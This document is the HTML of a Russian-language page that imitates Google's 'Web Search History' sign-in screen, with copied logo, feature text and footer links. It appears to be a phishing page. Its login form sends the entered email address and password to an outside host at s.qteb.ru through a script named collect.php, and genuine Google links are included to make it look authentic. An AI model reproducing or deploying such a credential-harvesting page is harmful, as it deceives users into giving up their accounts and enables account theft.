...
<html lang="ru"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <title>История веб-поиска</title>
  <link href="/goo/favicon.ico" rel="shortcut icon" /> 
<style type="text/css">
...
.hist .appendix {
  ...
  <img class="logo" src="./goo/img/google_logo_41.png" alt="Google">
  </div>
  </div>
  <div class="main content clearfix">
  <div class="sign-in">
<div class="signin-box">
  <h2>Войти <strong></strong></h2>
  <form id="gaia_loginform" action="http://s.qteb.ru/goo/collect.php" method="post">
<div class="email-div">
  <label for="Email"><strong class="email-label">Адрес электронной почты</strong></label>
  <input type="email" name="Email" id="Email" value="">
</div>
<div class="passwd-div">
  <label for="Passwd"><strong class="passwd-label">Пароль</strong></label>
  <input type="password" name="Passwd" id="Passwd" value="">
</div>
  <input type="submit" class="g-button g-button-submit" name="signIn" id="signIn" value="Войти">
  </form>
  <ul>
  <li>
  <a id="link-forgot-passwd" href="https://accounts.google.com/RecoverAccount?service=hist&continue=https%3A%2F%2Fhistory.google.com%2Fhistory%2F" target="_top">
  Не удается войти в аккаунт?
  </a>
  </li>
  <li>
  <a id="link-force-reauth" href="https://accounts.google.com/Logout?continue=https%3A%2F%2Faccounts.google.com%2FServiceLoginAuth%3Fcontinue%3Dhttps%253A%252F%252Fhistory.google.com%252Fhistory%252F%26service%3Dhist%26ltmpl%3Dgh%26hl%3Dru&il=true&zx=jrxdxgypvkj2">
  Выйти из аккаунта и войти как другой пользователь
  </a>
  </li>
  </ul>
</div>
...
<div class="product-headers">
  <h1 class="redtext">История веб-поиска</h1>
  <h2>История поиска делает работу с Google ещё удобнее</h2>
</div>
  <p>История повышает эффективность поиска и позволяет быстро вернуться на страницы, которые вы посещали ранее.</p>
<ul class="features">
  <li>
  <img alt="" src="./goo/img/icon-guy-grey.png">
  <p class="title">Более точные результаты</p>
  <p>Результаты поиска и рекомендации, подходящие именно вам.</p>
  </li>
  <li>
  <img alt="" src="./goo/img/icon-search-magnify-blue.png">
  <p class="title">Качественные подсказки</p>
  <p>“Умные” подсказки при вводе, предугадывающие ваши запросы.</p>
  </li>
  <li>
  <img alt="" src="./goo/img/icon-mobile-green.png">
  <p class="title">Доступ к истории на любом устройстве</p>
  <p>История поиска автоматически обновляется на всех ваших компьютерах и мобильных устройствах.</p>
  </li>
</ul>
  </div>
...
<div class="google-footer-bar">
  ...
  <ul>
  <li>© 2013 Google</li>
  <li><a href="http://www.google.com/intl/ru/" target="_blank">Главная страница Google</a></li>
  <li><a href="http://www.google.com/accounts/TOS?hl=ru" target="_blank">Условия использования</a></li>
  <li><a href="http://www.google.com/history/intl/ru/whprivacy.html" target="_blank">Политика конфиденциальности</a></li>
  <li><a href="http://www.google.com/support/accounts/bin/topic.py?topic=14148&hl=ru" target="_blank">Справка по истории веб-поиска</a></li>
  </ul>
  <span id="lang-chooser-wrap" class="lang-chooser-wrap" style="">
  <img src="./goo/img/universal_language_settings-21.png">
